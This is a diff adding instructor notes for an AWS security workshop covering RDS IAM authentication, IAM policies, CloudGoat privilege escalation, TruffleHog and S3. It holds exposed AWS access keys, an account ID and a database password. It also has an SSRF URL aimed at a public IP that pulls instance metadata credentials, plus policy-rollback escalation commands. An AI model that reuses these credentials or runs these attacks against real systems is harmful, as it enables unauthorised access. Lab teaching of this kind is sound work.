@@ -1,0 +1,210 @@
+Introduction about cloud security
+latest breaches
+
+Login to AWS Account
+
+https://aws.amazon.com/console/
+https://console.aws.amazon.com/console/home?region=us-east-1#
+
+
+Image to be used - Amazon Linux 2018
+
+create subnet and vpc
+refer below document for creating subnets
+http://www.davidc.net/sites/default/subnets/subnets.html
+
+
+create security groups
+aws secure deployment
+
+difference between security groups and network acls
+https://medium.com/awesome-cloud/aws-difference-between-security-groups-and-network-acls-adc632ea29ae
+
+
+create internet gateway
+attach internet gateway to vpc
+create route
+add route in route table
+attach route to subnet
+
+
+Login to EC2 instance
+
+
+https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/TUT_WebAppWithRDS.html
+
+
+sudo yum update -y
+sudo yum install -y httpd24 php56 php56-mysqlnd
+sudo service httpd start
+
+sudo yum install git
+sudo groupadd www
+sudo usermod -a -G www ec2-user
+exit
+
+login again
+
+groups
+sudo chgrp -R www /var/www
+sudo chmod 2775 /var/www
+find /var/www -type d -exec sudo chmod 2775 {} +
+find /var/www -type f -exec sudo chmod 0664 {} +
+
+cd /var/www/html
+
+
+arn:aws:rds:us-east-1:703182831838:dbuser:kiran
+
+mysql -h leave1.cln8oggr7sha.us-east-1.rds.amazonaws.com -P 3306 -u root -p leave1
+kiran123
+
+
+CREATE USER kiran IDENTIFIED WITH AWSAuthenticationPlugin as 'RDS';
+GRANT USAGE ON *.* TO 'kiran'@'%'REQUIRE SSL;
+
+GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, RELOAD, PROCESS, REFERENCES, INDEX, ALTER, SHOW DATABASES, CREATE TEMPORARY TABLES, LOCK TABLES, EXECUTE, REPLICATION SLAVE, REPLICATION CLIENT, CREATE VIEW, SHOW VIEW, CREATE ROUTINE, ALTER ROUTINE, CREATE USER, EVENT, TRIGGER ON *.* TO 'kiran'@'%' WITH GRANT OPTION;
+
+RDSHOST="leave1.cln8oggr7sha.us-east-1.rds.amazonaws.com"
+TOKEN="$(aws rds generate-db-auth-token --hostname $RDSHOST --port 3306 --region us-east-1 --username kiran)"
+
+mysql --host=$RDSHOST --port=3306 --ssl-ca=rds-ca-2019-root.pem --enable-cleartext-plugin --user=kiran --password=$TOKEN
+
+
+Create a IAM Policy
+
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Action": [
+                "rds-db:connect"
+            ],
+            "Resource": [
+                "arn:aws:rds:us-east-1:703182831838:dbuser:kiran"
+            ]
+        }
+    ]
+}
+
+
+How do I allow users to connect to Amazon RDS with IAM credentials?
+
+https://aws.amazon.com/premiumsupport/knowledge-center/users-connect-rds-iam/
+
+
+How do I create another master user for my Amazon RDS DB instance that is running MySQL?
+
+https://aws.amazon.com/premiumsupport/knowledge-center/duplicate-master-user-mysql/
+
+
+AWS IAM
+enable mfa - steps to do
+show how to create users and create various users and grant various policies
+details about roles
+attach roles to ec2 instance
+
+
+
+AWS IAM cloudgoat-
+
+AWS IAM Deep Dive
+https://www.slideshare.net/AmazonWebServices/deep-dive-into-aws-iam
+
+https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/iam_privesc_by_rollback
+
+create a user and understand various policies
+
+search for access keys using trufflehog
+
+get the access keys and use enumerate-iam tool to identify the priveleges
+
+https://github.com/andresriancho/enumerate-iam
+
+./enumerate-iam.py --access-key AKIA2HOHWQDPOQOHAMN2 --secret-key zRyCcHbonr9BrEF4TnpdkxBVvf9pe7wecrpKVeZu
+
+attacks example using cloudgoat - policy
+
+cloudgoat_output_aws_account_id = 703182831838
+cloudgoat_output_raynor_access_key_id = AKIA2HOHWQDPOQOHAMN2
+cloudgoat_output_raynor_secret_key = zRyCcHbonr9BrEF4TnpdkxBVvf9pe7wecrpKVeZu
+
+
+export AWS_PROFILE=raynor
+
+CheatSheet
+
+https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/iam_privesc_by_rollback/cheat_sheet_raynor.md
+
+
+aws configure --profile raynor
+
+aws iam list-attached-user-policies --user-name raynor --profile Raynor
+
+aws iam list-policy-versions --policy-arn <generatedARN>/cg-raynor-policy --profile Raynor
+
+aws iam get-policy-version --policy-arn <generatedARN>/cg-raynor-policy --version-id <versionID> --profile Raynor
+
+aws iam set-default-policy-version --policy-arn <generatedARN>/cg-raynor-policy --version-id <versionID> --profile Raynor
+
+
+
+SSRF Demo using Leave management Application
+
+http://3.91.206.44.nip.io/leave/php/user.php?r=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials#
+
+
+
+https://awspolicygen.s3.amazonaws.com/policygen.html
+enable mfa - steps to do
+attacks example using cloudgoat - policy
+use trufflehog and get access keys
+https://pypi.org/project/truffleHog/
+pip install truffleHog
+https://github.com/dxa4481/truffleHog
+
+truffleHog --regex --entropy=True https://github.com/sakiran/leave.git
+
+show shannon entropy
+https://gchq.github.io/CyberChef/
+
+
+configure cli
+aws s3 ls
+An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
+
+attack example using ssrf
+
+aws s3
+
+
+AWS S3 Security and Management
+https://www.slideshare.net/AmazonWebServices/deep-dive-on-amazon-s3-security-and-management-e2471stg303r1-aws-reinvent-2018?from_action=save
+
+
+
+s3 bucket logging
+https://blog.runpanther.io/s3-bucket-access-logging/
+
+encrypting sensitive data in s3
+https://cloudonaut.io/encrypting-sensitive-data-stored-on-s3/
+
+presign s3 object
+https://docs.aws.amazon.com/cli/latest/reference/s3/presign.html
+
+Show Paytm example for S3 presign URL
+
+
+https://blog.webiny.com/upload-files-to-aws-s3-using-pre-signed-post-data-and-a-lambda-function-7a9fb06d56c1
+https://blog.bigbinary.com/2018/09/04/uploading-files-directly-to-s3-using-pre-signed-post-request.html
+
+aws cloud trail
+
+https://medium.com/panther-labs/aws-security-logging-fundamentals-cloudtrail-c7733789a5dd
+
+AWS KMS
+
+https://github.com/aws-samples/aws-kms-workshop
+
+boto library
